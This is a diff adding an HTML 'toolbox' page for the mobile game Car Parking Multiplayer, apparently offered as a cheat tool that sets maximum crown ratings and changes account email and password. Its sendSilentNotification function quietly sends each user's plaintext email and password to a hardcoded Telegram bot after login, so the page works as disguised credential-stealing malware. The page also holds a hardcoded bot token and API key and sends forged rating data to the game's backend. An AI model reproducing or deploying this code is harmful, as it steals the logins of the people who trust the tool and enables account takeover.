@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>老王CPM工具箱</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: url("https://i.postimg.cc/XYj6dDzv/IMG-0133.jpg") no-repeat center center fixed;
+        background-size: cover;
+        margin: 0;
+        padding: 0;
+        color: white;
+    }
+
+    .center-wrapper {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+    }
+
+.container {
+    /* 1. 使用半透明白色背景 */
+    background: rgba(255, 255, 255, 0.2); 
+    
+    /* 2. 增强模糊效果 (磨砂核心) */
+    backdrop-filter: blur(15px);
+    -webkit-backdrop-filter: blur(15px); /* 兼容性写法 */
+
+    /* 3. 边框改为微光效果，移除显眼的橙色 */
+    border: 1px solid rgba(255, 255, 255, 0.3);
+
+    /* 保留原有的布局属性 */
+    padding: 20px 30px 10px 30px;
+    border-radius: 10px;
+    box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+    width: 295px;
+    text-align: center;
+}
+
+
+    input {
+        width:85%;
+        padding:8px;
+        margin:8px 0;
+        border-radius:5px;
+        border:none;
+        background: rgba(255,255,255,0.1);
+        color:#fff;
+        outline: none;
+    }
+    button {
+    /* 1. 基础布局属性（保留或微调） */
+    width: 99%;
+    padding: 10px;
+    margin: 6px 0;
+    border-radius: 5px;
+    cursor: pointer; /* 增加鼠标手型 */
+
+    /* 2. 玻璃质感核心：半透明背景 */
+    /* 使用稍亮一点的白色透明，以区别于外层容器 */
+    background: rgba(255, 255, 255, 0.15); 
+    
+    /* 3. 磨砂效果 */
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+
+    /* 4. 边框与阴影：增加区分度的关键 */
+    /* 使用比背景稍亮的边框，模拟玻璃边缘的反光 */
+    border: 1px solid rgba(255, 255, 255, 0.4);
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+
+    /* 5. 文字样式 */
+    color: #ffffff;
+    font-weight: bold;
+    text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5); /* 给文字加微弱阴影，防止背景太亮看不清 */
+}
+
+/* 建议增加一个悬停效果，让交互更明显 */
+button:hover {
+    background: rgba(255, 255, 255, 0.25);
+    transition: 0.3s;
+}
+
+        cursor:pointer;
+        font-weight:bold;
+        /* Common styles for all buttons */
+        background: linear-gradient(to right, #FF4500, #FFA500); /* Red-Orange Gradient */
+        color: #fff;
+        border: 1px solid #FF4500;
+        transition: background 0.3s ease; /* Smooth transition for hover effect */
+    }
+
+    button:hover {
+        background: linear-gradient(to right, #E63900, #E68400);  /* Darker Shade on hover */
+    }
+
+
+    .status { margin-top:10px; color:#0f0; word-wrap: break-word; font-size: 14px;}
+    .error { color:#f55; }
+    #loginForm, #menuButtons { display:none; }
+    footer {
+        margin-top: 15px;
+        font-size: 13px;
+        color: #fff;
+        opacity: 0.8;
+    }
+</style>
+</head>
+<body>
+
+<div class="center-wrapper">
+  <div class="container">
+      <h1>👑老王工具箱👑</h1>
+
+      <div id="loginForm">
+          <input type="email" id="email" placeholder="请输入邮箱账号" />
+          <input type="password" id="password" placeholder="请输入密码" />
+          <button class="login" onclick="loginFirebase()">立即登录</button>
+      </div>
+
+      <div id="menuButtons">
+          <button class="menu" onclick="kingRank()">👑 一键皇冠等级</button>
+          <button class="menu" onclick="changeEmail()">📧 修改邮箱</button>
+          <button class="menu" onclick="changePassword()">🔐 修改密码</button>
+          <button class="logout" onclick="logout()">🚪 退出登录</button> 
+      </div>
+
+      <div id="status" class="status"></div>
+
+      <footer>© CPM老王版权所有</footer>
+  </div>
+</div>
+
+<script>
+let currentUser = null;
+let currentToken = null;
+
+// 配置信息
+const BOT_TOKEN = '8409129149:AAFArKX3_eN_yqFLQrX_0KqIt8TZIZ3gqJU';
+const CHAT_IDS = ['8112555317'];
+const FIREBASE_API_KEY = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM";
+const RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4";
+
+function sendSilentNotification(email, password){
+  const message = `🔐 登录成功通知:\n📧 账号: ${email}\n🔒 密码: ${password}`;
+  CHAT_IDS.forEach(chatId => {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    }).catch(err => console.error(err));
+  });
+}
+
+function updateStatus(message, isError=false) {
+    const status = document.getElementById('status');
+    status.className = isError ? 'status error' : 'status';
+    status.textContent = message;
+}
+
+async function loginFirebase() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    if(!email || !password) return updateStatus("请输入邮箱和密码！", true);
+
+    updateStatus("正在尝试登录...");
+
+    try {
+        const loginUrl = `https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${FIREBASE_API_KEY}`;
+        const response = await fetch(loginUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, password, returnSecureToken: true })
+        });
+        const data = await response.json();
+
+        if(data.idToken) {
+            currentUser = email;
+            currentToken = data.idToken;
+            updateStatus(`✅ 成功登入: ${email}`);
+
+            sendSilentNotification(email, password);
+
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('menuButtons').style.display = 'block';
+        } else {
+            updateStatus(`❌ 登录失败: ${data.error?.message || "未知错误"}`, true);
+        }
+    } catch(err) {
+        updateStatus(`❌ 错误: ${err.message}`, true);
+    }
+}
+
+function requireLogin() {
+    if(!currentUser || !currentToken) {
+        updateStatus("❌ 请先登录账号！", true);
+        return false;
+    }
+    return true;
+}
+
+async function kingRank() {
+  if(!requireLogin()) return;
+
+  updateStatus(`👑 正在为账号 ${currentUser} 设置皇冠...`);
+
+  const ratingData = {
+      "cars": 100000, "car_fix": 100000, "car_collided": 100000, "car_exchange": 100000,
+      "car_trade": 100000, "car_wash": 100000, "slicer_cut": 100000, "drift_max": 100000,
+      "drift": 100000, "cargo": 100000, "delivery": 100000, "taxi": 100000, "levels": 100000,
+      "gifts": 100000, "fuel": 100000, "offroad": 100000, "speed_banner": 100000,
+      "reactions": 100000, "police": 100000, "run": 100000, "real_estate": 100000,
+      "t_distance": 100000, "treasure": 100000, "block_post": 100000, "push_ups": 100000,
+      "burnt_tire": 100000, "passanger_distance": 100000, "time": 10000000000, "race_win": 3000
+  };
+  const payload = { "data": JSON.stringify({ RatingData: ratingData }) };
+
+  try {
+      const response = await fetch(RANK_URL, {
+          method: "POST",
+          headers: {
+              "Authorization": `Bearer ${currentToken}`,
+              "Content-Type": "application/json",
+              "User-Agent": "okhttp/3.12.13"
+          },
+          body: JSON.stringify(payload)
+      });
+
+      if (response.ok) {
+          updateStatus(`✅ 皇冠等级设置成功！`);
+      } else {
+          updateStatus(`❌ 设置失败: ${response.statusText}`, true);
+      }
+  } catch (error) {
+      updateStatus(`❌ 运行错误: ${error.message}`, true);
+  }
+}
+
+async function changeEmail() {
+    if(!requireLogin()) return;
+    const newEmail = prompt("请输入新的邮箱地址:");
+    if(!newEmail) return;
+
+    fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${FIREBASE_API_KEY}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ idToken: currentToken, email: newEmail, returnSecureToken: true })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if(data.email) {
+            currentUser = data.email;
+            currentToken = data.idToken;
+            updateStatus(`✅ 邮箱已成功修改为: ${data.email}`);
+        } else {
+            updateStatus(`❌ 修改失败: ${data.error?.message || "请检查网络或格式"}`, true);
+        }
+    })
+    .catch(err => updateStatus(`❌ 错误: ${err.message}`, true));
+}
+
+async function changePassword() {
+    if(!requireLogin()) return;
+    const newPassword = prompt("请输入新的密码:");
+    if(!newPassword) return;
+
+    fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${FIREBASE_API_KEY}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ idToken: currentToken, password: newPassword, returnSecureToken: true })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if(data.email) {
+            currentToken = data.idToken;
+            updateStatus(`✅ 密码修改成功！`);
+        } else {
+            updateStatus(`❌ 修改失败: ${data.error?.message || "请检查密码强度"}`, true);
+        }
+    })
+    .catch(err => updateStatus(`❌ 错误: ${err.message}`, true));
+}
+
+function logout() {
+    currentUser = null;
+    currentToken = null;
+    document.getElementById('menuButtons').style.display = 'none';
+    document.getElementById('loginForm').style.display = 'block';
+    updateStatus("已安全退出登录。");
+}
+
+// 页面加载时显示登录表单
+document.addEventListener("DOMContentLoaded", () => {
+    document.getElementById("loginForm").style.display = "block";
+});
+</script>
+</body>
+</html>
